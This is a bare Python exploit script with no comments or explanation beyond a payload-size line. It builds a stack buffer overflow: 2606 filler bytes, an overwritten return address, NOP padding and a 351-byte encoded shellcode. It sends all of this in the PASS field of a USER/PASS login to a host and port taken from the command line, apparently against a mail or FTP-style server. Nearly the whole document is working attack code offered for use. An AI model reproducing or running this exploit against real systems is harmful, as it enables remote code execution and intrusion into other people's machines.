#!/usr/bin/python

import socket
import sys

# Payload size: 351 bytes

buf =  ""
buf += "\xbb\xf9\xdb\xd4\x96\xda\xcd\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x58\x0e\x03\xa1\xd5\x36"
buf += "\x63\xad\x02\x34\x8c\x4d\xd3\x59\x04\xa8\xe2\x59\x72"
buf += "\xb9\x55\x6a\xf0\xef\x59\x01\x54\x1b\xe9\x67\x71\x2c"
buf += "\x5a\xcd\xa7\x03\x5b\x7e\x9b\x02\xdf\x7d\xc8\xe4\xde"
buf += "\x4d\x1d\xe5\x27\xb3\xec\xb7\xf0\xbf\x43\x27\x74\xf5"
buf += "\x5f\xcc\xc6\x1b\xd8\x31\x9e\x1a\xc9\xe4\x94\x44\xc9"
buf += "\x07\x78\xfd\x40\x1f\x9d\x38\x1a\x94\x55\xb6\x9d\x7c"
buf += "\xa4\x37\x31\x41\x08\xca\x4b\x86\xaf\x35\x3e\xfe\xd3"
buf += "\xc8\x39\xc5\xae\x16\xcf\xdd\x09\xdc\x77\x39\xab\x31"
buf += "\xe1\xca\xa7\xfe\x65\x94\xab\x01\xa9\xaf\xd0\x8a\x4c"
buf += "\x7f\x51\xc8\x6a\x5b\x39\x8a\x13\xfa\xe7\x7d\x2b\x1c"
buf += "\x48\x21\x89\x57\x65\x36\xa0\x3a\xe2\xfb\x89\xc4\xf2"
buf += "\x93\x9a\xb7\xc0\x3c\x31\x5f\x69\xb4\x9f\x98\x8e\xef"
buf += "\x58\x36\x71\x10\x99\x1f\xb6\x44\xc9\x37\x1f\xe5\x82"
buf += "\xc7\xa0\x30\x04\x97\x0e\xeb\xe5\x47\xef\x5b\x8e\x8d"
buf += "\xe0\x84\xae\xae\x2a\xad\x45\x55\xbd\x12\x31\x55\x5a"
buf += "\xfb\x40\x55\xa5\x40\xcd\xb3\xcf\xa6\x98\x6c\x78\x5e"
buf += "\x81\xe6\x19\x9f\x1f\x83\x1a\x2b\xac\x74\xd4\xdc\xd9"
buf += "\x66\x81\x2c\x94\xd4\x04\x32\x02\x70\xca\xa1\xc9\x80"
buf += "\x85\xd9\x45\xd7\xc2\x2c\x9c\xbd\xfe\x17\x36\xa3\x02"
buf += "\xc1\x71\x67\xd9\x32\x7f\x66\xac\x0f\x5b\x78\x68\x8f"
buf += "\xe7\x2c\x24\xc6\xb1\x9a\x82\xb0\x73\x74\x5d\x6e\xda"
buf += "\x10\x18\x5c\xdd\x66\x25\x89\xab\x86\x94\x64\xea\xb9"
buf += "\x19\xe1\xfa\xc2\x47\x91\x05\x19\xcc\xb1\xe7\x8b\x39"
buf += "\x5a\xbe\x5e\x80\x07\x41\xb5\xc7\x31\xc2\x3f\xb8\xc5"
buf += "\xda\x4a\xbd\x82\x5c\xa7\xcf\x9b\x08\xc7\x7c\x9b\x18"

nop = "\x90" * (390-351)


def main():
	bytes = "A" * 2606 + "\x8f\x35\x4a\x5f" + nop + buf

	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sck.connect((sys.argv[1], int(sys.argv[2])))

	sck.recv(1024)
	sck.send("USER teste\r\n")
	sck.recv(1024)
	sck.send("PASS " + bytes + "\r\n")
	sck.recv(1024)

try:
	main()
except Exception as e:
	print(str(e))